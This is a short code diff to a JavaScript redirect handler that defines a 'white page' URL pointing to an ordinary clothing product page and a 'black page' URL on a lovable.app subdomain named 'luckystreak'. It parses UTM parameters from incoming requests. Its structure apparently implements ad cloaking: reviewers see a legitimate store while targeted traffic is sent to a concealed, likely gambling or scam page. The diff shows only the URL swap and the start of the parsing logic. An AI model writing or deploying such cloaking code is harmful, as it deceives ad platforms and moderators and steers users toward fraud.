@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://botanicalbaby.com.au/products/organic-zip-growsuit-in-cockatoo?pr_prod_strat=jac&pr_rec_id=02986c9cd&pr_rec_pid=7247996256454&pr_ref_pid=8047876407494&pr_seq=uniform";
-    const blackPageURL = "https://csshhpluv.lovable.app/?";
+    const whitePageURL = "https://beechtree.pk/products/bt22502un006634-blue";
+    const blackPageURL = "https://luckystreak.lovable.app/";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -26,6 +26,7 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
 
